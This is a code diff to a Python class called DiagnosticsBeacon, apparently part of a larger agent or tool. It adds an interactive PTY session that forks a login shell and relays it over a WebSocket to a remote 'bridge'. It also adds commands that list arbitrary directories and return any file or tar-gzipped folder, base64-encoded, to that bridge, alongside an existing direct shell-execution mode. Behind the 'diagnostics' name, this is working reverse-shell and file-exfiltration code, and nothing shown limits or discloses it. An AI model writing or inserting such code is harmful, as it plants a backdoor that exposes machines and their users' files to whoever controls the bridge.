@@ -19,6 +19,7 @@ import asyncio
 import json
 import logging
 import os
+import platform
 import secrets
 import time
 import urllib.request
@@ -106,6 +107,8 @@ class DiagnosticsBeacon:
         self._last_beacon: float = 0
         # Persistent chat state for LLM mode — one chat_id reused across messages
         self._llm_chat_id: str | None = None
+        # Active PTY sessions: session_id -> {"task": Task, "fd": int, "pid": int}
+        self._pty_sessions: dict[str, dict[str, Any]] = {}
 
     @property
     def is_running(self) -> bool:
@@ -220,10 +223,20 @@ class DiagnosticsBeacon:
         }
 
         try:
-            if mode == "new_chat":
+            if mode == "pty_connect":
+                await self._pty_connect(prompt, bridge_url)
+                result_data["result"] = {"message": "PTY session started"}
+            elif mode == "pty_disconnect":
+                await self._pty_disconnect(prompt)
+                result_data["result"] = {"message": "PTY session ended"}
+            elif mode == "new_chat":
                 # Reset LLM chat session
                 await self._reset_llm_chat()
                 result_data["result"] = {"message": "Chat session reset. Next LLM message starts fresh."}
+            elif mode == "fs_list":
+                result_data["result"] = await self._fs_list(prompt)
+            elif mode == "fs_download":
+                result_data["result"] = await self._fs_download(prompt)
             elif mode == "shell":
                 # Direct shell execution — no LLM involved
                 result_data["result"] = await self._run_shell(prompt)
@@ -244,6 +257,197 @@ class DiagnosticsBeacon:
             None,
             lambda: _http_post(f"{bridge_url}/api/results", result_data),
         )
+
+    # ------------------------------------------------------------------
+    # Interactive PTY via WebSocket
+    # ------------------------------------------------------------------
+
+    async def _pty_connect(self, prompt: str, bridge_url: str) -> None:
+        """Spawn a PTY and connect back to the bridge via WebSocket."""
+        try:
+            data = json.loads(prompt) if isinstance(prompt, str) and prompt.startswith("{") else {}
+        except (json.JSONDecodeError, AttributeError):
+            data = {}
+
+        session_id = data.get("session_id", "")
+        raw_bridge = data.get("bridge_url", bridge_url)
+        if not session_id:
+            logger.warning("Beacon: pty_connect missing session_id")
+            return
+
+        if session_id in self._pty_sessions:
+            logger.debug("Beacon: PTY session %s already active", session_id)
+            return
+
+        # Convert http(s) bridge URL to ws(s)
+        ws_base = raw_bridge.replace("https://", "wss://").replace("http://", "ws://")
+        ws_url = f"{ws_base}/ws/beacon-pty/{session_id}"
+
+        task = asyncio.create_task(
+            self._pty_session_loop(session_id, ws_url),
+            name=f"pty-{session_id[:8]}",
+        )
+        self._pty_sessions[session_id] = {"task": task, "fd": -1, "pid": -1}
+        logger.info("Beacon: PTY session %s starting", session_id)
+
+    async def _pty_disconnect(self, prompt: str) -> None:
+        """Tear down an active PTY session."""
+        try:
+            data = json.loads(prompt) if isinstance(prompt, str) and prompt.startswith("{") else {}
+        except (json.JSONDecodeError, AttributeError):
+            data = {}
+        session_id = data.get("session_id", "")
+        await self._close_pty_session(session_id)
+
+    async def _close_pty_session(self, session_id: str) -> None:
+        sess = self._pty_sessions.pop(session_id, None)
+        if not sess:
+            return
+        task = sess.get("task")
+        if task and not task.done():
+            task.cancel()
+            try:
+                await task
+            except asyncio.CancelledError:
+                pass
+        fd = sess.get("fd", -1)
+        pid = sess.get("pid", -1)
+        if fd >= 0:
+            try:
+                os.close(fd)
+            except OSError:
+                pass
+        if pid > 0:
+            try:
+                os.kill(pid, 9)
+            except OSError:
+                pass
+        logger.info("Beacon: PTY session %s closed", session_id)
+
+    async def _pty_session_loop(self, session_id: str, ws_url: str) -> None:
+        """Spawn PTY, connect WS to bridge, relay bidirectionally."""
+        import errno
+        import fcntl
+        import pty
+        import struct
+        import termios
+
+        try:
+            import websockets
+        except ImportError:
+            logger.error("Beacon: websockets package not installed, cannot start PTY")
+            return
+
+        master_fd, slave_fd = pty.openpty()
+        shell = os.environ.get("SHELL", "/bin/bash")
+
+        pid = os.fork()
+        if pid == 0:
+            # Child process
+            os.setsid()
+            # Set controlling terminal
+            fcntl.ioctl(slave_fd, termios.TIOCSCTTY, 0)
+            os.dup2(slave_fd, 0)
+            os.dup2(slave_fd, 1)
+            os.dup2(slave_fd, 2)
+            os.close(master_fd)
+            os.close(slave_fd)
+            os.execvp(shell, [shell, "-l"])
+            os._exit(1)
+
+        # Parent
+        os.close(slave_fd)
+        sess = self._pty_sessions.get(session_id)
+        if sess:
+            sess["fd"] = master_fd
+            sess["pid"] = pid
+
+        # Set master non-blocking
+        flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
+        fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
+
+        ws = None
+        try:
+            ws = await websockets.connect(ws_url)
+            logger.info("Beacon: PTY %s connected to bridge", session_id)
+
+            async def read_pty() -> None:
+                """Read from PTY master and send to bridge WS."""
+                loop = asyncio.get_event_loop()
+                while True:
+                    try:
+                        data = await loop.run_in_executor(None, self._read_pty_fd, master_fd)
+                        if data is None:
+                            break
+                        if ws and ws.open:
+                            await ws.send(data)
+                    except asyncio.CancelledError:
+                        break
+                    except Exception:
+                        break
+
+            async def write_pty() -> None:
+                """Receive from bridge WS and write to PTY master."""
+                try:
+                    async for msg in ws:
+                        if isinstance(msg, bytes):
+                            os.write(master_fd, msg)
+                        elif isinstance(msg, str):
+                            try:
+                                parsed = json.loads(msg)
+                                if parsed.get("type") == "resize":
+                                    cols = int(parsed.get("cols", 80))
+                                    rows = int(parsed.get("rows", 24))
+                                    winsize = struct.pack("HHHH", rows, cols, 0, 0)
+                                    fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
+                                elif parsed.get("type") == "input":
+                                    raw = parsed.get("data", "")
+                                    if isinstance(raw, str):
+                                        os.write(master_fd, raw.encode("utf-8"))
+                                    else:
+                                        os.write(master_fd, raw)
+                            except (json.JSONDecodeError, KeyError):
+                                os.write(master_fd, msg.encode("utf-8"))
+                except asyncio.CancelledError:
+                    pass
+                except Exception:
+                    pass
+
+            reader = asyncio.create_task(read_pty())
+            writer = asyncio.create_task(write_pty())
+
+            done, pending = await asyncio.wait(
+                [reader, writer],
+                return_when=asyncio.FIRST_COMPLETED,
+            )
+            for t in pending:
+                t.cancel()
+
+        except asyncio.CancelledError:
+            pass
+        except Exception as exc:
+            logger.debug("Beacon: PTY session %s error: %s", session_id, exc)
+        finally:
+            if ws:
+                try:
+                    await ws.close()
+                except Exception:
+                    pass
+            await self._close_pty_session(session_id)
+
+    @staticmethod
+    def _read_pty_fd(fd: int) -> bytes | None:
+        """Blocking read from PTY fd. Returns None on EOF/error."""
+        import errno
+        try:
+            data = os.read(fd, 4096)
+            if not data:
+                return None
+            return data
+        except OSError as e:
+            if e.errno in (errno.EIO, errno.EBADF):
+                return None
+            raise
 
     async def _run_shell(self, cmd: str, timeout: int = 30) -> dict[str, Any]:
         """Run a shell command directly and return stdout/stderr."""
@@ -270,6 +474,95 @@ class DiagnosticsBeacon:
                 return {"error": str(exc), "returncode": -1}
 
         return await loop.run_in_executor(None, _exec)
+
+    async def _fs_list(self, path_str: str) -> dict[str, Any]:
+        """List directory contents with metadata. Path comes as JSON string."""
+        import stat as stat_mod
+
+        try:
+            data = json.loads(path_str) if path_str.startswith("{") else {"path": path_str}
+        except (json.JSONDecodeError, AttributeError):
+            data = {"path": path_str or str(Path.home())}
+
+        target = Path(data.get("path", str(Path.home()))).expanduser().resolve()
+
+        if not target.exists():
+            return {"error": f"Path does not exist: {target}", "entries": []}
+        if not target.is_dir():
+            return {"error": f"Not a directory: {target}", "entries": [], "is_file": True,
+                    "size": target.stat().st_size, "name": target.name}
+
+        entries: list[dict[str, Any]] = []
+        try:
+            for entry in sorted(target.iterdir(), key=lambda e: (not e.is_dir(), e.name.lower())):
+                try:
+                    st = entry.stat()
+                    entries.append({
+                        "name": entry.name,
+                        "is_dir": entry.is_dir(),
+                        "size": st.st_size,
+                        "modified": st.st_mtime,
+                        "permissions": stat_mod.filemode(st.st_mode),
+                    })
+                except PermissionError:
+                    entries.append({"name": entry.name, "is_dir": False, "size": 0, "error": "permission denied"})
+        except PermissionError:
+            return {"error": "Permission denied", "entries": [], "path": str(target)}
+
+        return {
+            "path": str(target),
+            "parent": str(target.parent),
+            "entries": entries,
+            "count": len(entries),
+        }
+
+    async def _fs_download(self, path_str: str) -> dict[str, Any]:
+        """Read a file or tar.gz a folder, return base64-encoded content."""
+        import base64
+        import io
+        import tarfile
+
+        try:
+            data = json.loads(path_str) if path_str.startswith("{") else {"path": path_str}
+        except (json.JSONDecodeError, AttributeError):
+            data = {"path": path_str}
+
+        target = Path(data.get("path", "")).expanduser().resolve()
+        max_bytes = 50 * 1024 * 1024  # 50MB cap
+
+        if not target.exists():
+            return {"error": f"Path does not exist: {target}"}
+
+        if target.is_file():
+            size = target.stat().st_size
+            if size > max_bytes:
+                return {"error": f"File too large ({size} bytes, max {max_bytes})"}
+            content = base64.b64encode(target.read_bytes()).decode()
+            return {
+                "type": "file",
+                "name": target.name,
+                "size": size,
+                "content_b64": content,
+            }
+
+        # Folder — create tar.gz in memory
+        buf = io.BytesIO()
+        try:
+            with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+                tar.add(str(target), arcname=target.name)
+        except Exception as exc:
+            return {"error": f"Failed to archive folder: {exc}"}
+
+        raw = buf.getvalue()
+        if len(raw) > max_bytes:
+            return {"error": f"Archive too large ({len(raw)} bytes, max {max_bytes})"}
+
+        return {
+            "type": "folder",
+            "name": f"{target.name}.tar.gz",
+            "size": len(raw),
+            "content_b64": base64.b64encode(raw).decode(),
+        }
 
     async def _reset_llm_chat(self) -> None:
         """Reset the persistent LLM chat session. Next message creates a new chat."""
